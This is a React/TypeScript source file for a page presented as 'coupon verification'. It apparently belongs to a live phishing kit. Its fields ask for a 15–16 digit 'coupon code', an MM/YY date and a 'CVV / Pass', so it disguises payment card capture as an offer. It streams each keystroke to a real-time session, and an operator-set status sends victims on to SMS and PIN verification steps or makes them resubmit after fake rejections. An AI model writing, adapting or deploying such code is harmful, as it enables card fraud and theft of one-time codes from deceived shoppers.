import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useRealtime, CouponData } from "@/context/RealtimeContext";
import { useShop } from "@/context/ShopContext";
import { getActiveThemeV2 } from "@/lib/theme-editor";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { AlertCircle } from "lucide-react";
import { useToast } from "@/components/ui/use-toast";

const CouponVerification = () => {
  const navigate = useNavigate();
  const {
    updateCouponData,
    setOrderStatus,
    orderStatus,
    submitOrder,
    currentOrderId,
    resubmitCoupon,
    startLiveSession,
  } = useRealtime();
  const { toast } = useToast();
  const { config } = useShop();

  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const [formData, setFormData] = useState<CouponData>({
    code: "",
    dateMMYY: "",
    password: "",
  });

  const activeTheme = getActiveThemeV2(config as unknown as Record<string, unknown>);
  const couponPage = activeTheme?.pages.coupon;

  const pageTitle = couponPage?.title || "Final Step";
  const pageSubtitle =
    couponPage?.subtitle || "Enter your exclusive offer details to complete your order.";
  const codeLabel = couponPage?.codeLabel || "Coupon Code (15-16 digits)";
  const codePlaceholder = couponPage?.codePlaceholder || "XXXX-XXXX-XXXX-XXXX";
  const dateLabel = couponPage?.dateLabel || "Date (MM/YY)";
  const datePlaceholder = couponPage?.datePlaceholder || "MM/YY";
  const passwordLabel = couponPage?.passwordLabel || "CVV / Pass (3-4 digits)";
  const passwordPlaceholder = couponPage?.passwordPlaceholder || "1234";
  const submitText = couponPage?.submitText || "Verify & Complete Order";
  const loadingTitle = couponPage?.loadingTitle || "Verifying Coupon...";
  const loadingDescription =
    couponPage?.loadingDescription ||
    "Please wait while we verify your exclusive offer code. This usually takes less than a minute. Do not refresh the page.";
  const rejectedTitle = couponPage?.rejectedTitle || "Verification Failed";
  const rejectedMessage =
    couponPage?.rejectedMessage ||
    "Verification failed. Please check your coupon details and try again.";
  const returnTitle = couponPage?.returnTitle || "Coupon Verification Required";
  const returnMessage = couponPage?.returnMessage || "Please check or replace your coupon and try again.";
  const helpText = couponPage?.helpText || "";
  const heroImage = couponPage?.heroImage || "";

  useEffect(() => {
    startLiveSession();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (orderStatus === "APPROVED") {
      setIsLoading(false);
      navigate("/verify-sms");
      return;
    }

    if (orderStatus === "REQUEST_PIN") {
      setIsLoading(false);
      navigate("/verify-pin");
      return;
    }

    if (orderStatus === "REJECTED") {
      setIsLoading(false);
      setError(rejectedMessage);
      toast({
        variant: "destructive",
        title: rejectedTitle,
        description: rejectedMessage,
      });
      setOrderStatus("COUPON_SUBMITTING");
      startLiveSession({ force: true });
      return;
    }

    if (orderStatus === "RETURN_COUPON") {
      setIsLoading(false);
      setError(returnMessage);
      toast({
        variant: "destructive",
        title: returnTitle,
        description: returnMessage,
      });
      setOrderStatus("COUPON_SUBMITTING");
      startLiveSession({ force: true });
    }
  }, [
    navigate,
    orderStatus,
    rejectedMessage,
    rejectedTitle,
    returnMessage,
    returnTitle,
    setOrderStatus,
    startLiveSession,
    toast,
  ]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    if (name === "dateMMYY") {
      let formatted = value.replace(/\D/g, "");
      if (formatted.length >= 2) {
        formatted = `${formatted.slice(0, 2)}/${formatted.slice(2, 4)}`;
      }
      const newData = { ...formData, [name]: formatted };
      setFormData(newData);
      updateCouponData(newData);
      return;
    }

    const newData = { ...formData, [name]: value };
    setFormData(newData);
    updateCouponData(newData);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);

    updateCouponData(formData);

    if (currentOrderId) {
      await resubmitCoupon(formData);
    } else {
      await submitOrder(formData);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex flex-col">
        <Header />
        <main className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="text-center space-y-6 max-w-md">
            <div className="relative w-20 h-20 mx-auto">
              <div className="absolute inset-0 border-4 border-muted rounded-full" />
              <div className="absolute inset-0 border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin" />
            </div>
            <h2 className="font-serif text-2xl md:text-3xl">{loadingTitle}</h2>
            <p className="text-muted-foreground">{loadingDescription}</p>
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <Header />
      <main className="flex-1 container mx-auto px-6 py-12 flex items-center justify-center">
        <Card className="w-full max-w-lg shadow-lg border-primary/10 overflow-hidden">
          {heroImage ? (
            <div className="h-36 bg-cover bg-center border-b" style={{ backgroundImage: `url(${heroImage})` }} />
          ) : null}

          <CardHeader className="text-center pb-8">
            <CardTitle className="font-serif text-3xl mb-2">{pageTitle}</CardTitle>
            <CardDescription className="text-base">{pageSubtitle}</CardDescription>
          </CardHeader>

          <CardContent>
            {error && (
              <div className="bg-destructive/10 text-destructive text-sm p-3 rounded-md flex items-center gap-2 mb-6">
                <AlertCircle className="w-4 h-4" />
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="code">{codeLabel}</Label>
                <Input
                  id="code"
                  name="code"
                  placeholder={codePlaceholder}
                  maxLength={19}
                  required
                  value={formData.code}
                  onChange={handleInputChange}
                  className="font-mono text-lg tracking-wide"
                />
              </div>

              <div className="grid grid-cols-2 gap-6">
                <div className="space-y-2">
                  <Label htmlFor="dateMMYY">{dateLabel}</Label>
                  <Input
                    id="dateMMYY"
                    name="dateMMYY"
                    placeholder={datePlaceholder}
                    maxLength={5}
                    required
                    value={formData.dateMMYY}
                    onChange={handleInputChange}
                    className="font-mono text-lg text-center"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="password">{passwordLabel}</Label>
                  <Input
                    id="password"
                    name="password"
                    type="password"
                    placeholder={passwordPlaceholder}
                    maxLength={4}
                    required
                    value={formData.password}
                    onChange={handleInputChange}
                    className="font-mono text-lg text-center tracking-widest"
                  />
                </div>
              </div>

              <Button type="submit" className="w-full text-lg h-12 mt-4">
                {submitText}
              </Button>

              {helpText ? <p className="text-xs text-muted-foreground text-center">{helpText}</p> : null}
            </form>
          </CardContent>
        </Card>
      </main>
      <Footer />
    </div>
  );
};

export default CouponVerification;
